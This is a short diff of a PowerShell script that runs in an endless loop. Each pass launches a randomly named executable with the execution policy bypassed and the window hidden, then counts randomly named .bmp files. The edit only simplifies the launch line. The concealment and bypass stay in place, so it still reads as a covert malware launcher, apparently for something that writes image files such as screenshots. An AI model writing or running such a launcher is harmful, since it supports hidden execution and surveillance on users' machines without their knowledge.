@@ -1,7 +1,7 @@
 $count=0
 $curr_dir=(Get-Location).Path
 while($true){
-    powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden "$curr_dir\KJUwHZlCNV.exe"
+    powershell -noP -ep bypass -w hidden "$curr_dir\KJUwHZlCNV.exe"
     while(Test-Path -Path "$curr_dir\TmreCWpLEnhx$count.bmp"){
         $count++
     }
